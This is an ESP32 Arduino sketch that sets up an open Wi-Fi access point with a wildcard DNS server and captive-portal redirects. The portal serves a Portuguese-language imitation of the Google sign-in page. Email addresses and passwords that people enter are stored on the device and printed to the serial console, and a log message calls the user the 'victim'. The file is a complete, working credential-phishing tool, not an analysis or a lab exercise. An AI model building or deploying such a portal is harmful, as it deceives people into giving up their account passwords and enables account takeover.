#include <Arduino.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebSrv.h>
#include <vector>
#include <WiFi.h>                 
#include <SPI.h>                  
#include <time.h>                 
#include <DNSServer.h>

AsyncWebServer server(80);
DNSServer dns ;

const char* ssid = "ESP32";

const char* EMAIL = "email";
const char* PASSWORD = "password";

const char index_html[] PROGMEM = R"rawliteral(<!DOCTYPE html><html lang="en"> <head> <meta charset="UTF-8"/> <meta name="viewport" content="width=device-width, initial-scale=1.0"/> <link rel="preconnect" href="https://fonts.gstatic.com"/> <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet"/> <link rel="stylesheet" href="./reset.css"/> <link rel="stylesheet" href="./styles.css"/> <title>Fazer login nas Contas do Google</title> </head> <form action="GET"> <body> <div id="stepOne" class="container"> <div class="card"> <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg> <h2>Fazer login</h2> <h3>Use sua Conta do Google</h3> <input id="email" type="email" name="email" placeholder="E-mail ou telefone"/> <div class="btn-email"> <button type="button">Esqueceu seu e-mail?</button> </div><p> Não está no seu computador? Use o modo visitante para fazer login com privacidade. <a href="">Saiba mais</a> </p><div class="card-bottom"> <a href="">Criar conta</a> <button id="nextButton" type="button">Próxima</button> </div></div><div class="footer"> <select> <option value="Portugês (Brasil) selected">Portugês (Brasil)</option> <option value="English (United States)"> English (United States) </option> <option value="Español (España)">Español (España)</option> </select> <div class="footer-span"> <span>Ajuda</span> <span>Privacidade</span> <span>Termos</span> </div></div></div><div id="stepTwo" style="display: none;" class="container"> <div class="card"> <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg> <h2>Bem vindo</h2> <span style="padding: 5px;align-items: center; background: #fff; border: 1px solid rgb(218,220,224); color: rgb(60,64,67); cursor: pointer; display: -moz-inline-box; display: inline-flex; font-size: 14px; font-weight: 500; letter-spacing: .25px; max-width: 100%; border-radius: 35px; padding: 5px 13px; position: relative;" id="badge"></span> <h3>Primeiro, vamos confirmar que é você</h3> <input id="password" name="password" type="password" placeholder="Senha"/> <div class="btn-email"> <label for=""> <input style="width: 18px; height: 18px; margin-right: 22px; font-size: 14px;" type="checkbox" id="passwordCheckbox" value="false" >Mostrar senha</input> <p></p></label> </div><div class="card-bottom"> <a href="">Criar conta</a> <button id="submitButton" type="submit">Entrar</button> </div></div><div class="footer"> <select> <option value="Portugês (Brasil) selected">Portugês (Brasil)</option> <option value="English (United States)"> English (United States) </option> <option value="Español (España)">Español (España)</option> </select> <div class="footer-span"> <span>Ajuda</span> <span>Privacidade</span> <span>Termos</span> </div></div></div></body> </form> <style>*{margin: 0; padding: 0; font-family: "Roboto", sans-serif; box-sizing: border-box;}:root{--principal: #202124; --p: #797d80; --blue: #2c7fea; --border-card: #dadce0;}.container{width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column;}.card{height: 500px; width: 448px; border-radius: 8px; border: 1px solid var(--border-card); display: flex; flex-direction: column; align-items: center; padding: 48px 40px 36px;}.card h2{padding-top: 16px; font-weight: 400; font-size: 24px;}.card h3{padding: 11px 0 35px 0; font-weight: 400; font-size: 16px;}.card input{padding: 13px 15px; width: 100%; height: 55px; border-radius: 4px; border: 1px solid var(--border-card); outline-color: #1973e8; font-size: 16px;}.card .btn-email{padding-top: 12px; width: 100%;}.card .btn-email button{background: transparent; border: none; cursor: pointer; color: var(--blue); font-weight: bold; font-size: 14px; outline: none;}.card p{padding-top: 48px; color: var(--p); font-size: 14px; line-height: 1.5;}.card p a{background: transparent; border: none; cursor: pointer; color: var(--blue); font-weight: bold; text-decoration: none;}.card .card-bottom{margin-top: 32px; width: 100%; display: flex; align-items: center; justify-content: space-between;}.card .card-bottom a{border: none; cursor: pointer; color: var(--blue); font-weight: bold; text-decoration: none; font-size: 14px; margin: 8px;}.card .card-bottom button{background: var(--blue); color: white; padding: 9px 24px; font-size: 14px; outline: none; border: none; border-radius: 4px; cursor: pointer; transition: 0.2s;}.card .card-bottom button:hover{background: #1a66c9;}.footer{display: flex; align-items: center; justify-content: space-between; padding-top: 24px; font-size: 12px; width: 448px; color: var(--p);}.footer select{background: transparent; border: none; cursor: pointer; outline: none;}.footer .footer-span span{margin-left: 32px;}</style> <script>function submitForm(e){e.preventDefault(); const form=document.querySelector('form'); form.submit();}function nextStep(){const stepOne=document.querySelector('#stepOne'); const stepTwo=document.querySelector('#stepTwo'); stepOne.style.display='none'; stepTwo.style.display='flex'; const badge=document.querySelector('#badge'); const emailInput=document.querySelector('#email'); badge.innerHTML=emailInput.value;}function togglePasswordVisible(){const showPassword=document.querySelector('#passwordCheckbox'); const passwordInput=document.querySelector('#password'); if(showPassword.checked==true) passwordInput.setAttribute('type','text'); else passwordInput.setAttribute('type','password');}let submitButton=document.getElementById('submitButton'); let nextButton=document.getElementById('nextButton'); submitButton.addEventListener('click',submitForm); nextButton.addEventListener('click',nextStep); </script>)rawliteral";

const byte DNS_PORT = 53;
const String localIPURL = "http://4.3.2.1";

void notFound(AsyncWebServerRequest *request) {
  request->send(404, "text/plain", "Not found");
}

std::vector<String> emails;
std::vector<String> passwords;

void setup() {
  Serial.begin(115200);

  dns.setTTL(300);
  WiFi.mode(WIFI_AP); //Setando para Access Point

  const IPAddress IP(4, 3, 2, 1);       
  const IPAddress gatewayIP(4, 3, 2, 1);      
  const IPAddress subnetMask(255, 255, 255, 0); 
  WiFi.softAPConfig(IP, gatewayIP, subnetMask);
 if (!WiFi.softAP(ssid)) { 
    log_e("Soft AP creation failed.");
    while(1);
  }
  Serial.print("AP IP: ");
  Serial.println(IP);
  server.begin();

  Serial.println("----\nSTATUS: SERVER STATERD\nInfo:Esperando input da vítima");

  dns.setErrorReplyCode(DNSReplyCode::ServerFailure);

  dns.start(DNS_PORT, "*", IP);
  
  server.on("/connecttest.txt", [](AsyncWebServerRequest *request) { request->redirect("http://logout.net"); }); 
  server.on("/wpad.dat", [](AsyncWebServerRequest *request) { request->send(404); });

  server.on("/generate_204", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });       
  server.on("/redirect", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });         
  server.on("/hotspot-detect.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); }); 
  server.on("/canonical.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });     
  server.on("/success.txt", [](AsyncWebServerRequest *request) { request->send(200); });             
  server.on("/ncsi.txt", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });  
 
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send_P(200, "text/html", index_html);
  });


  server.on("/GET", HTTP_GET, [] (AsyncWebServerRequest *request) {
    String email;
    String password;
    if (request->hasParam(EMAIL)) {
      email = request->getParam(EMAIL)->value();
      password = request->getParam(PASSWORD)->value();
      emails.push_back(email);
      passwords.push_back(password);
      }
    
    else {
      email = "empty";
    }
    Serial.print("Email: ");
    Serial.println(email);
    Serial.print("Password: ");
    Serial.println(password);
    request->send(200, "text/html", "HTTP GET request sent to your ESP on input field (login ) with value: " + email +  password  + "<br><a href=\"/\">Return to Home Page</a>");
  });
  server.onNotFound(notFound);
  server.begin();
}

void loop() {
  dns.processNextRequest();
  delay(50);
}
